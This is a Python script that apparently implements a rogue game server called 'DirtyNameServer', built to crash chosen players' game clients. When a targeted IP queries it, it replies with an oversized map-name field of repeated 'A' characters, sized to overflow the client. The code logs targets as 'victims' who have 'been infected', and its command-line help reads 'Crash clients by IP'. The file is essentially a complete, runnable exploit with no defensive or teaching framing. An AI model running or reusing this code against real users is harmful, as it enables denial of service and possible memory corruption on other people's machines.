from datetime import datetime
import argparse
import Server
import Packet
import Logger


class DirtyNameServer(Server.Server):
    def __init__(self, injected_ip_list, *args, **kwargs):
        super(DirtyNameServer, self).__init__(*args, **kwargs)
        self.ip_list = injected_ip_list

    def start(self, *args, **kwargs):
        self.logger.info("Started server for injecting DirtyName vulnerability")
        self.logger.info("These are the victims {}".format(self.ip_list))
        super(DirtyNameServer, self).start(*args, **kwargs)

    def _get_info_handler(self, received_packet, address):
        if address[0] in self.ip_list:
                packet = Packet.Packet()
                packet.id = Packet.TYPE_INFO_RESPONSE
                packet.info = self.info
                challenge = received_packet.id_parameter
                if challenge == "xxx":
                    packet.info["challenge"] = challenge
                else:
                    packet.info["challenge"] = challenge[:-1]

                self.logger.info("{} has been infected".format(address))
                #packet.info["mapname"] = "A" * 4000
                #self._send(packet, address)
                packet.info["mapname"] = "A" * (2064-189)
                b = Packet.pack(packet)
                print len(b)
                self.server.sendto(b, address)

def main():
    parser = argparse.ArgumentParser(description="Crash clients by IP")
    parser.add_argument("port", type=int)
    parser.add_argument("ip_list", metavar="IP", nargs="+", help="IP list")
    args = parser.parse_args()
    Logger.MainLogger.log_to_file(datetime.now().strftime("Logs\\%Y_%m_%d_%H_%M_%S_DirtyName.log"))
    server = DirtyNameServer(args.ip_list, "0.0.0.0", args.port, "104.40.23.123", 20110)
    server.start()
    Logger.MainLogger.close()

if __name__ == "__main__":
    main()